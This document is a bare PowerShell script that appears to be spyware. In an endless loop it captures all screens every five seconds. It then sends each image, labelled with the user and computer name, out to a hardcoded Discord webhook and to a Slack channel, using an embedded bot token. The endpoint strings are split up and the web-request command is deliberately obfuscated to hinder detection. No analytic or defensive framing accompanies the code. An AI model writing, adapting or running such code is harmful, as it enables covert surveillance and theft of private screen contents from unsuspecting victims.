$dwbt='https://discord.com/api/webhooks/10779346' + '36958744617/zh07WaxN4jLLI1ZqiB-SHDOKL8Jl2qWi' + 'OccN7yEMtvpKF0ZLRJDUlC6CodWBak9MRATi'
$swbt='https://hooks.slack.com/services/T08F0' + '53J6G5/B08FXT4AHU0/MhBJ6ZQkjW5dzKwDi6yow9FB'
$sat = "xoxb-8510173618549-855156999" + "8048-9VGiG8Blv8C7OABqVo9xP9m5"

while(1){
  Add-Type -AssemblyName System.Windows.Forms,System.Drawing

  $screens = [Windows.Forms.Screen]::AllScreens

  $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
  $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
  $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
  $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum

  $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
  
  $bmp = New-Object System.Drawing.Bitmap ($bounds.Width, $bounds.Height)
  $graphics = [Drawing.Graphics]::FromImage($bmp)

  $dpiX = $graphics.DpiX / 96.0
  $dpiY = $graphics.DpiY / 96.0

  $scaledBounds = New-Object Drawing.Rectangle (0, 0, [int]($bounds.Width * $dpiX), [int]($bounds.Height * $dpiY))
  
  $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $scaledBounds.Size)
  
  $bmp.Save("$env:USERPROFILE\AppData\Local\Temp\crab.png")
  $graphics.Dispose()
  $bmp.Dispose()

  Start-Sleep -Seconds 5

  try { $ffp = Join-Path -Path $env:USERPROFILE -ChildPath '\AppData\Local\Temp\crab.png' } catch {}
  if (Test-Path $ffp) {
      $uu = $env:USERNAME
      $cc = $env:computername
      $tml = (Get-Date -Format HHmmss)
      try { $fb = [System.IO.File]::ReadAllBytes($ffp) } catch { continue }
      $bd = [System.Guid]::NewGuid().ToString()
      $lf = "`r`n"
      $pt1 = @{
          "username" = $uu
          "content"  = "`**Screenshot Captured For $cc At $tml`**"
      } | ConvertTo-Json -Compress
      $q1t = (
          "--$bd",
          "Content-Disposition: form-data; name=`"payload_json`"",
          "Content-Type: application/json",
          "",
          $pt1,
          "--$bd",
          "Content-Disposition: form-data; name=`"file`"; filename=`"Capture.png`"",
          "Content-Type: application/octet-stream",
          "",
          [System.Text.Encoding]::UTF8.GetString($fb),
          "--$bd--"
      ) -join $lf
      $hh = @{
          "Content-Type" = "multipart/form-data; boundary=$bd"
      }
      i""r''m -Uri $dwbt -Method Post -Headers $hh -Body $q1t > $null
  
      $st1 = "https://slack.com/api/files.getUploadURLExternal?filename=" + $(Split-Path -Leaf $ffp) + "&length=" + $fb.Length
      $sh = @{
          "Authorization" = "Bearer $sat"
          "Content-Type"  = "application/x-www-form-urlencoded"
      }
      $luur = i""r''m -Uri $st1 -Method Get -Headers $sh
      if ($luur.upload_url) {
          $suh = @{
              "Content-Type" = "application/octet-stream"
          }
          i""r''m -Uri $luur.upload_url -Method Post -Headers $suh -Body $fb > $null
          $scu = "https://slack.com/api/files.completeUploadExternal"
          $scb = @{
              "files" = @(@{ "id" = $luur.file_id; "title" = "Capture.png" })
              "channel_id" = "C08F8RJ84P5"
              "initial_comment"  = "`*Screenshot Captured For $cc At $tml`*"
          } | ConvertTo-Json -Compress
          $sh = @{
              "Authorization" = "Bearer $sat"
              "Content-Type"  = "application/json"
          }
          i""r''m -Uri $scu -Method Post -Headers $sh -Body $scb > $null 
      }
  }
}
